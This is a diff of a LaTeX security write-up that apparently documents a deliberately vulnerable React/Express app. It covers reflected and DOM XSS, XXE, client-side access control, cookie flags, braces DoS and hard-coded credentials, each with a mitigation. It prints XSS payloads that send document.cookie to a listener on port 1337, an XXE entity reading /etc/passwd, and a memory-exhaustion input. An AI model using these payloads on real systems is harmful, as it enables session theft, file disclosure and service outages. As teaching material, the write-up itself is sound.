+Reflected Cross-Site Scripting (XSS) occurs when user input is reflected in the server's response without proper validation. For example, an attacker might craft a malicious search URL containing a script. The server processes the request without sanitizing the input, and the frontend displays a message like "You are searching for XYZ," where "XYZ" is the malicious script. The browser then executes the script, potentially exposing sensitive data. Reflected XSS, also known as Non-Persistent XSS, happens in a single request-response cycle. \\ 
 \textbf{Vulnerable code:}
-Consider the situation where users can search for sellers by username. The vulnerable React code in \texttt{routes/locatorPage.js} retrieves the seller's username from the URL query parameter \texttt{sellerUsername} and displays it using the \texttt{dangerouslySetInnerHTML} property.
-
+Consider the situation where users can search for sellers by username. The vulnerable React code in \texttt{routes/locatorPage.js} retrieves the seller's username from the URL query parameter \texttt{sellerUsername} and displays it using the \texttt{dangerouslySetInnerHTML} property. \\ 
 Here is the vulnerable code:
 \begin{lstlisting}
 <p>You are searching for seller: <span dangerouslySetInnerHTML={{__html: sellerUsername}}></span> </p> 
 \end{lstlisting}
-
 \textbf{Exploitation:}
 An attacker can craft a malicious URL like this:
 
 \begin{lstlisting}
 http://localhost:3000/user/locator?sellerUsername=<audio src="" onerror="fetch('http://localhost:1337', {method:'POST', body:document.cookie})">
 \end{lstlisting}
-
-When a user clicks on this URL, the script executes and sends the user's cookies to the attacker's server listening on port 1337. The attacker can capture the cookies using netcat.
-
+When a user clicks on this URL, the script executes and sends the user's cookies to the attacker's server listening on port 1337. The attacker can capture the cookies using netcat. \\ 
 \textbf{Mitigation:}
 To prevent Reflected XSS vulnerabilities, it is essential to set cookies with the \texttt{HttpOnly: true} flag to block access to \texttt{document.cookie}, properly handle and sanitize all user inputs, especially those included in the URL, and stop using \texttt{dangerouslySetInnerHTML}.
 
@@ -1191,24 +1215,20 @@ To prevent Reflected XSS vulnerabilities, it is essential to set cookies with th
 
 DOM-Based Cross-Site Scripting (XSS) is a type of XSS attack caused by improper handling of untrusted input on the client-side, rather than the server-side. This means the vulnerability exists within the client-side code (e.g., JavaScript) that manipulates the DOM, without any need to reach back to the web server. As standalone web applications become more prevalent, the importance of securing client-side code against DOM XSS has increased.
 
-In a DOM XSS attack, the malicious script is injected and executed entirely within the browser, modifying the DOM to perform unauthorized actions or exfiltrate sensitive data.
-
+In a DOM XSS attack, the malicious script is injected and executed entirely within the browser, modifying the DOM to perform unauthorized actions or exfiltrate sensitive data. \\ 
 \textbf{Vulnerable code:}
 Consider the possibility for users to change the theme color. The vulnerable React code in \texttt{routes/changeTheme.js} retrieves the theme color (\texttt{themeChosen} variable) from the '\texttt{color}' URL parameter and displays it using the \texttt{dangerouslySetInnerHTML} property:
 
 \begin{lstlisting}
 <p style={{ marginTop: '20px' }}>You selected: <strong dangerouslySetInnerHTML={{__html:themeChosen}}></strong></p>
 \end{lstlisting}
-
 \textbf{Exploitation:}
 An attacker can craft a malicious URL like this:
 
 \begin{lstlisting}
 http://localhost:3000/user/changeTheme?color=<audio src="" onerror="fetch('http://localhost:1337',{method:'POST',body:document.cookie})">
 \end{lstlisting}
-
-When a user visits this URL, the script executes and sends the user's cookies to the attacker's server listening on port 1337. The attacker can capture the cookies using netcat.
-
+When a user visits this URL, the script executes and sends the user's cookies to the attacker's server listening on port 1337. The attacker can capture the cookies using netcat. \\ 
 \textbf{Mitigation:}
 To prevent DOM XSS vulnerabilities, it is essential to set cookies with the \texttt{HttpOnly: true} flag to prevent access to \texttt{document.cookie}, properly handle and sanitize all user inputs before they are used to manipulate the DOM, and avoid using \texttt{dangerouslySetInnerHTML}.
 
@@ -1260,11 +1280,9 @@ Insecure Design arises when security considerations are insufficiently integrate
 
 \subsubsection{Client-side Enforcement of Server-side Security}
 
-Client-side enforcement of server-side security occurs when a web application relies on the frontend to enforce security policies, which should be enforced on the server-side. This vulnerability allows attackers to manipulate client-side code to bypass security checks, potentially gaining unauthorized access or performing actions they should not be able to.
-
+Client-side enforcement of server-side security occurs when a web application relies on the frontend to enforce security policies, which should be enforced on the server-side. This vulnerability allows attackers to manipulate client-side code to bypass security checks, potentially gaining unauthorized access or performing actions they should not be able to. \\ 
 \textbf{Description:}
-In many web applications, the frontend is designed to display certain elements or allow certain actions only if the user has specific privileges, such as being an admin. However, if the server does not validate these privileges and relies solely on the frontend for enforcement, attackers can manipulate the frontend code to gain unauthorized access or perform unauthorized actions. It's even worse due to the fact that React Developer Tools were NOT disabled via 'disableReactDevTools()', so all the frontend code is easily modifiable.
-
+In many web applications, the frontend is designed to display certain elements or allow certain actions only if the user has specific privileges, such as being an admin. However, if the server does not validate these privileges and relies solely on the frontend for enforcement, attackers can manipulate the frontend code to gain unauthorized access or perform unauthorized actions. It's even worse due to the fact that React Developer Tools were NOT disabled via 'disableReactDevTools()', so all the frontend code is easily modifiable. \\ 
 \textbf{Vulnerable code:}
 Consider the scenario where the web application allows users to delete transactions only if they are admins (in theory). The frontend uses a property to determine if the user is an admin and only shows the delete option if the user has admin privileges. However, the server does not check if the user is an admin before performing the delete operation. The vulnerable code in the Express backend in file \texttt{routes/transactions.js} looks like this:
 
@@ -1278,9 +1296,7 @@ router.post("/delete", function(req, res) {
         // ... other code
 });
 \end{lstlisting}
-
-In this example, the server checks if the user is logged in but does not verify if the user has admin privileges before allowing the deletion of a transaction.
-
+In this example, the server checks if the user is logged in but does not verify if the user has admin privileges before allowing the deletion of a transaction. \\ 
 \textbf{Exploitation:}  
 An attacker can exploit this vulnerability by altering the client-side code to trick the application into granting admin-level access. Here's how the attack might be done:
 
@@ -1291,11 +1307,8 @@ An attacker can exploit this vulnerability by altering the client-side code to t
 history.pushState(history.pushState.state, "", "/admin/homepage");
 window.dispatchEvent(new Event('popstate'));
 \end{lstlisting}
-
-By doing so, the attacker can access the admin interface and perform actions like listing or deleting transactions, despite lacking admin privileges, since the server fails to enforce role-based access control. 
-
-\textbf{Note:} This attack could also be performed by directly sending a crafted request (using the user's existing session cookie) to the server, without using the frontend at all.
-
+By doing so, the attacker can access the admin interface and perform actions like listing or deleting transactions, despite lacking admin privileges, since the server fails to enforce role-based access control. \\ 
+\textbf{Note:} This attack could also be performed by directly sending a crafted request (using the user's existing session cookie) to the server, without using the frontend at all. \\ 
 \textbf{Mitigation:}
 To prevent this type of vulnerability, the server must enforce all security policies. This includes verifying user privileges before performing any sensitive operations. The server should never rely on the frontend to enforce security checks. Here is an example of a more secure approach:
 
@@ -1349,8 +1362,7 @@ Security Misconfiguration occurs when security features are not properly configu
 
 \subsubsection{XML External Entities (XXE)}
 
-XML External Entity (XXE) vulnerabilities occur when an application processes XML input containing external entities, potentially leading to unauthorized access to sensitive files and data on the server.
-
+XML External Entity (XXE) vulnerabilities occur when an application processes XML input containing external entities, potentially leading to unauthorized access to sensitive files and data on the server. \\ 
 \textbf{Understanding XXE:}
 Below is an example of malicious XML designed to exploit an XXE vulnerability:
 
@@ -1369,9 +1381,7 @@ Below is an example of malicious XML designed to exploit an XXE vulnerability:
     \item \texttt{<!ENTITY xxe SYSTEM "file:///etc/passwd">}: Declares an external entity named \texttt{xxe} that points to the sensitive file \texttt{/etc/passwd}.
     \item \texttt{<seller><name>\&xxe;</name></seller>}: Uses the external entity \texttt{xxe} to include the contents of \texttt{/etc/passwd} within the XML document.
 \end{itemize}
-
 \textbf{Vulnerable Code:}
-
 The following code, found in the \texttt{routes/authentication.js} file of an Express backend, demonstrates how the vulnerability is introduced by improperly parsing XML input:
 
 \begin{lstlisting}
@@ -1390,7 +1400,6 @@ else if(req.body.xmlContent){
     }
 }
 \end{lstlisting}
-
 \textbf{Exploitation:}
 
 \begin{enumerate}
@@ -1400,9 +1409,7 @@ else if(req.body.xmlContent){
 
     \item \textbf{Data Exposure:} The parser resolves the external entity, retrieves the contents of the targeted file (e.g., \texttt{/etc/passwd}), and includes it in the XML document. This results in unauthorized disclosure of sensitive data, which is then included in the server's response and displayed in the frontend.
 \end{enumerate}
-
 \textbf{Mitigation:}
-
 To prevent XXE vulnerabilities, it is essential to disable external entity resolution and DTD processing in the XML parser. In `libxmljs`, this can be achieved by configuring the parser as follows:
 
 \begin{lstlisting}
@@ -1419,8 +1426,7 @@ This configuration ensures:
 \subsubsection{Sensitive Cookie Without Proper 'Secure', 'HttpOnly', and 'SameSite' Attributes}
 \label{subsubsec:sensitive_cookie_without_secure_and_httponly_attributes}
 
-A common 'security misconfiguration' weakness involves cookies lacking one or more essential attributes such as 'Secure', 'HttpOnly', or an appropriate 'SameSite' setting (though the 'Improper SameSite Attribute' weakness actually belongs to 'broken access control' risk category). These attributes serve different but complementary purposes in protecting cookies from various security threats.
-
+A common 'security misconfiguration' weakness involves cookies lacking one or more essential attributes such as 'Secure', 'HttpOnly', or an appropriate 'SameSite' setting (though the 'Improper SameSite Attribute' weakness actually belongs to 'broken access control' risk category). These attributes serve different but complementary purposes in protecting cookies from various security threats. \\ 
 \textbf{Vulnerable code:}
 There is a dangerous cookie configuration in \texttt{index.js} file of express backend:
 
@@ -1432,20 +1438,18 @@ cookie: {
     maxAge: 3600000000
 }
 \end{lstlisting}
-
 \textbf{Cookie Security Attributes:}
-
 In this example, improper configuration of three key cookie attributes introduces significant security risks:
-
-1. \textbf{Secure Attribute:}
+\begin{enumerate}
+\item \textbf{Secure Attribute:}
    The \texttt{secure: false} setting allows cookies to be transmitted over both HTTP and HTTPS connections. Without the 'Secure' attribute, cookies can be sent over unencrypted HTTP, making them vulnerable to interception by attackers.
 
-2. \textbf{HttpOnly Attribute:} 
+\item \textbf{HttpOnly Attribute:} 
    The \texttt{httpOnly: false} setting permits client-side scripts, such as JavaScript, to access cookies. Without the 'HttpOnly' attribute, cookies can be accessed by malicious scripts, increasing the risk of cross-site scripting (XSS) attacks. Attackers can steal sensitive cookies, such as session tokens, using JavaScript commands like \texttt{document.cookie}, leading to unauthorized access.
 
-3. \textbf{SameSite Attribute:}
+\item \textbf{SameSite Attribute:}
    The \texttt{sameSite: "None"} setting permits cookies to be sent with cross-origin requests, potentially enabling Cross-Site Request Forgery (CSRF) attacks. Attackers can exploit this by tricking users into making unintended requests to your server from a different site, leveraging the user's session cookies.
-
+\end{enumerate}
 \textbf{Mitigations:}  
 To mitigate these risks, the following steps should be taken:
 \begin{itemize}
@@ -1490,10 +1494,8 @@ app.use('/dir', express.static('./'), serveIndex('./', {'icons': true}))
 
 \subsubsection{Reverse Tabnabbing}
 
-\textbf{Description:} Reverse tabnabbing is an attack where a page linked from the target page is able to rewrite that page, for example to replace it with a phishing site. As the user was originally on the correct page they are less likely to notice that it has been changed to a phishing site, especially if the site looks the same as the target. If the user authenticates to this new page then their credentials (or other sensitive data) are sent to the phishing site rather than the legitimate one.
-
-The attack is typically possible when the source site uses a target instruction in a html link to specify a target loading location that do not replace the current location and then let the current window/tab available and does not include any of the preventative measures detailed below.
-
+\textbf{Description:} Reverse tabnabbing is an attack where a page linked from the target page is able to rewrite that page, for example to replace it with a phishing site. As the user was originally on the correct page they are less likely to notice that it has been changed to a phishing site, especially if the site looks the same as the target. If the user authenticates to this new page then their credentials (or other sensitive data) are sent to the phishing site rather than the legitimate one. \\ 
+The attack is typically possible when the source site uses a target instruction in a html link to specify a target loading location that do not replace the current location and then let the current window/tab available and does not include any of the preventative measures detailed below. \\ 
 The attack is also possible for link opened via the window.open javascript function.
 \\ \textbf{Vulnerable code:} In \texttt{sellerRegistration.js}:
 \begin{lstlisting}
@@ -1533,10 +1535,8 @@ Vulnerabilities in outdated components arise when software applications use thir
 \subsubsection{Using Components with Known Vulnerabilities}
 
 \textbf{Description:}
-Using libraries with known vulnerabilities creates significant risks. For example, the web application in question relies on the \texttt{braces} NPM package, which has a known vulnerability leading to Denial of Service (DoS) attacks due to uncontrolled resource consumption. The \texttt{braces} package is used to expand regex patterns into multiple strings. For instance, a regex pattern like \texttt{'seller' + '\{' + '9'.repeat(2) + ',' + 'test'.repeat(2) + '\}'} would be expanded into \texttt{'seller99'} and \texttt{'sellertesttest'}.
-
-So 'braces' package is used to create large lists of potential strings that we'd want to search in the database, without searching all possibilities one by one. But some specific patterns can lead to resource exhaustion, particularly if using a version of \texttt{braces} prior to 3.0.3.
-
+Using libraries with known vulnerabilities creates significant risks. For example, the web application in question relies on the \texttt{braces} NPM package, which has a known vulnerability leading to Denial of Service (DoS) attacks due to uncontrolled resource consumption. The \texttt{braces} package is used to expand regex patterns into multiple strings. For instance, a regex pattern like \texttt{'seller' + '\{' + '9'.repeat(2) + ',' + 'test'.repeat(2) + '\}'} would be expanded into \texttt{'seller99'} and \texttt{'sellertesttest'}. \\ 
+So 'braces' package is used to create large lists of potential strings that we'd want to search in the database, without searching all possibilities one by one. But some specific patterns can lead to resource exhaustion, particularly if using a version of \texttt{braces} prior to 3.0.3. \\ 
 \textbf{Vulnerable Code:}
 The vulnerability exists in the \texttt{routes/users.js} file of the Express backend, where regex patterns are processed as shown:
 
@@ -1544,22 +1544,17 @@ The vulnerability exists in the \texttt{routes/users.js} file of the Express bac
 const { braces } = require('micromatch');
 const finalSellerUsernameToSearch = braces(finalRegex, { expand: true });
 \end{lstlisting}
-
-Although the application employs `isolated-vm` to execute regex patterns safely, the \texttt{braces} library itself is vulnerable to attacks such as Heap memory exhaustion in versions before 3.0.3. Malicious inputs can overwhelm system memory, leading to server crashes.
-
+Although the application employs `isolated-vm` to execute regex patterns safely, the \texttt{braces} library itself is vulnerable to attacks such as Heap memory exhaustion in versions before 3.0.3. Malicious inputs can overwhelm system memory, leading to server crashes. \\ 
 \textbf{Exploitation:}
 An attacker can exploit this vulnerability by submitting regex patterns with an excessive number of nested braces, such as:
 
 \begin{lstlisting}
 'seller' + '{'.repeat(536870000)
 \end{lstlisting}
-
-This input causes the \texttt{braces} library to process a massive number of nested braces, resulting in an infinite loop and rapid consumption of Heap memory. The server eventually crashes due to memory exhaustion. 
-
+This input causes the \texttt{braces} library to process a massive number of nested braces, resulting in an infinite loop and rapid consumption of Heap memory. The server eventually crashes due to memory exhaustion. \\ 
 The number '536870000' is approximately the maximum number of characters that can be handled in a string by the V8 JavaScript engine, as noted in this GitHub issue: \footnotesize 'https://github.com/nodejs/node/issues/35973\#issuecomment-722253319'.\\
 \normalsize
-Malicious users can trigger this vulnerability by repeatedly submitting such patterns through the "Search" button on the 'Seller Locator' page, leading to server crashes due to Heap Memory exhaustion.
-
+Malicious users can trigger this vulnerability by repeatedly submitting such patterns through the "Search" button on the 'Seller Locator' page, leading to server crashes due to Heap Memory exhaustion. \\ 
 \textbf{Mitigation:}
 To mitigate this issue, update the \texttt{braces} package to version 3.0.3 or later, which includes a fix for this DoS vulnerability.
 
@@ -1570,16 +1565,13 @@ Identification and Authentication Failures occur when an attacker can bypass aut
 \subsubsection{Use of Hard-Coded Credentials}
 
 The use of hard-coded credentials is a serious security issue where sensitive information is embedded directly in the source code. This practice can lead to unauthorized access if the credentials are exposed or leaked. \\
-
 \textbf{Vulnerable Code:}
 In the specific context of the web application, hard-coded credentials were found in \texttt{authentication.js}. During development, a comment was mistakenly left in the code that revealed sensitive information. The comment in the \texttt{login} function was:
 
 \begin{lstlisting}
 // admin account is admin admin
 \end{lstlisting}
-
-This comment discloses the hard-coded credentials for the admin account. Although intended as a development note, it remains visible to the client and can be exploited by attackers. Comments, if not removed during building, remain visible in React frontend code accessible by the client.
-
+This comment discloses the hard-coded credentials for the admin account. Although intended as a development note, it remains visible to the client and can be exploited by attackers. Comments, if not removed during building, remain visible in React frontend code accessible by the client. \\ 
 \textbf{Mitigation:}
 To prevent the use of hard-coded credentials:
 \begin{itemize}
@@ -1589,7 +1581,7 @@ To prevent the use of hard-coded credentials:
 
 \subsubsection{Session timeouts not set correctly}
 \textbf{Description:} Application session timeouts aren't set correctly. A user uses a public computer to access an application. Instead of selecting "logout," the user simply closes the browser tab and walks away. An attacker uses the same browser an hour later, and the user is still authenticated. \\
-\textbf{Vulnerable code:} 
+\textbf{Vulnerable code:} in \texttt{index.js}
 \begin{lstlisting}
 app.use(
     session({
@@ -1614,10 +1606,8 @@ The vulnerability in the code lies in the \texttt{maxAge} parameter set to 36000
 
 \subsubsection{Session Prediction}
 
-\textbf{Description:} The session prediction attack focuses on predicting session ID values that permit an attacker to bypass the authentication schema of an application. By analyzing and understanding the session ID generation process, an attacker can predict a valid session ID value and get access to the application.
-
-In the first step, the attacker needs to collect some valid session ID values that are used to identify authenticated users. Then, they must understand the structure of session ID, the information that is used to create it, and the encryption or hash algorithm used by application to protect it. Some bad implementations use sessions IDs composed by username or other predictable information, like timestamp or client IP address. In the worst case, this information is used in clear text or coded using some weak algorithm like base64 encoding.
-
+\textbf{Description:} The session prediction attack focuses on predicting session ID values that permit an attacker to bypass the authentication schema of an application. By analyzing and understanding the session ID generation process, an attacker can predict a valid session ID value and get access to the application. \\ 
+In the first step, the attacker needs to collect some valid session ID values that are used to identify authenticated users. Then, they must understand the structure of session ID, the information that is used to create it, and the encryption or hash algorithm used by application to protect it. Some bad implementations use sessions IDs composed by username or other predictable information, like timestamp or client IP address. In the worst case, this information is used in clear text or coded using some weak algorithm like base64 encoding. \\ 
 In addition, the attacker can implement a brute force technique to generate and test different values of session ID until they successfully get access to the application.
 \\ \textbf{Vulnerable code:} In \texttt{index.js}:
 \begin{lstlisting}
